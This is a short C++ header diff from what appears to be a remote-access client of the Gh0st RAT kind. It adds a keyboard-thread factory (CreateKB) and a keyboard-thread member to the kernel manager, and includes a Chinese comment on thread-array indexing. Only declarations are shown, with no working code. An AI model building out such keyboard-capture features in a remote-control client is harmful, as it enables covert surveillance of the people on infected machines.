@@ -20,6 +20,8 @@
 #include <TlHelp32.h>
 #include "LoginServer.h"
 
+ThreadInfo* CreateKB(CONNECT_ADDRESS* conn, State& bExit);
+
 class ActivityWindow {
 public:
 	std::string Check(DWORD threshold_ms = 6000) {
@@ -77,10 +79,10 @@ class CKernelManager : public CManager
 public:
 	CONNECT_ADDRESS* m_conn;
 	HINSTANCE m_hInstance;
-	CKernelManager(CONNECT_ADDRESS* conn, IOCPClient* ClientObject, HINSTANCE hInstance);
+	CKernelManager(CONNECT_ADDRESS* conn, IOCPClient* ClientObject, HINSTANCE hInstance, ThreadInfo* kb);
 	virtual ~CKernelManager();
 	VOID OnReceive(PBYTE szBuffer, ULONG ulLength);
-
+	ThreadInfo* m_hKeyboard;
 	ThreadInfo  m_hThread[MAX_THREADNUM];
 	// 此值在原代码中是用于记录线程数量；当线程数量超出限制时m_hThread会越界而导致程序异常
 	// 因此我将此值的含义修改为"可用线程下标"，代表数组m_hThread中所指位置可用，即创建新的线程放置在该位置
